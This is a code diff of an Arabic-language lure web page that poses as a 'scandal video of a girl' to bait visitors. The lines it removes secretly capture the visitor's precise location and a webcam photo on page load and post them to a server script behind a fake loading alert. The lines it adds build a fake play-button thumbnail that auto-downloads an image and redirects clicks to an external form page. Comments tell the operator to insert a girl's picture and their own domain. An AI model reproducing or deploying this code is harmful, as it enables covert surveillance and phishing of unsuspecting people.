@@ -4,66 +4,78 @@
     <meta charset="UTF-8">
     <title>مشاهدة فديو فضيحة بنت في مدينة التل</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f0f2f5; }
-        #video, #canvas { display: none; }
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f0f2f5;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .video-container {
+            position: relative;
+            width: 300px;
+            height: 200px;
+            background-image: url('https://appsyria00.github.io/vpn/proxyimage.png'); /* استبدل بصورة بنت */
+            background-size: cover;
+            background-position: center;
+            border-radius: 10px;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        .play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: transform 0.3s;
+        }
+        .play-button::before {
+            content: '';
+            width: 0;
+            height: 0;
+            border-top: 15px solid transparent;
+            border-bottom: 15px solid transparent;
+            border-left: 25px solid white;
+        }
+        .video-container:hover .play-button {
+            transform: translate(-50%, -50%) scale(1.1);
+        }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="video-container" id="capture">
+        <div class="play-button"></div>
+    </div>
+    <p style="font-size: 14px; color: #666;">اضغط لمشاهدة الفيديو الترويجي!</p>
     <script>
+        // توليد الصورة عند تحميل الصفحة
         window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        sendData("lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
-                    },
-                    function(error) {
-                        console.log("Location error: " + error.message);
-                        sendData("location_error=1");
-                    },
-                    { enableHighAccuracy: true, maximumAge: 0 }
-                );
-            } else {
-                sendData("location_not_supported=1");
+            html2canvas(document.querySelector('#capture')).then(canvas => {
+                const link = document.createElement('a');
+                link.download = 'proxyimage.png';
+                link.href = canvas.toDataURL('image/png');
+                link.click(); // تحميل الصورة تلقائيًا
+            });
+
+            // التوجيه عند النقر
+            function redirectToForm() {
+                window.location.href = 'https://appsyria00.github.io/vpn/proxy.html'; // استبدل بدومينك
             }
-
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    var video = document.getElementById('video');
-                    video.srcObject = stream;
-                    setTimeout(function() {
-                        var canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        var dataURL = canvas.toDataURL('image/png');
-                        sendData("image=" + encodeURIComponent(dataURL));
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 1000);
-                })
-                .catch(function(err) {
-                    console.log("Camera error: " + err.message);
-                    sendData("camera_error=1");
-                });
-            alert("جارٍ تحميل الفيديو في الخلفية...");
+            document.querySelector('.video-container').onclick = redirectToForm;
         };
-
-        function sendData(data) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "save_data.php", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    if (xhr.status === 200) {
-                        console.log("Data sent successfully: " + xhr.responseText);
-                    } else {
-                        console.log("Failed to send data: " + xhr.status + " - " + xhr.responseText);
-                    }
-                }
-            };
-            xhr.send(data);
-        }
     </script>
 </body>
 </html>
